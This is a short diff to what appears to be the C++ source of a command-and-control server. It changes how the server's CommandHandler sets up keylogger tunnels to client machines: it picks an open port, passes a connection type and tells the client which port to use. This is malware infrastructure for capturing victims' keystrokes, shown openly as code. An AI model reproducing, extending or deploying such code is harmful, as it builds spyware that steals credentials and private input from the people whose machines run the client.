@@ -401,17 +401,22 @@ void CommandHandler::keylogger() {
             Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, keylogger);
             p_tunnels_->emplace_back(tunnel);
             try {
-                std::thread(&CommandHandler::handle_tunnelt, this, tunnel).detach();
+                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
             } catch (const std::system_error& e) {
                 *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Error creating thread for keylogger" << RESET_C2_FIFO;
                 erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
             }
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Keylogger is already active for client " << client_index << RESET_C2_FIFO;
         }
     }
 }
 
-void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel) {
-    if (__p_tunnel->p_spy_tunnel_->init(*p_ip_, port_, __p_tunnel->p_tunnel_shutdown_fd_, TCP_BASED) == 0) {
+void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel, int __connection_type) {
+    uint port = find_open_port();
+    
+    if (port > 0 && __p_tunnel->p_spy_tunnel_->init(*p_ip_, port, __p_tunnel->p_tunnel_shutdown_fd_, __connection_type) == 0) {
+        send_client(__p_tunnel->command_code_, port-port_, __p_tunnel->client_index_);
         __p_tunnel->p_spy_tunnel_->edit_path(__p_tunnel->client_index_, __p_tunnel->command_code_);
         Tunnel::active_tunnels_++;
         __p_tunnel->p_spy_tunnel_->run();
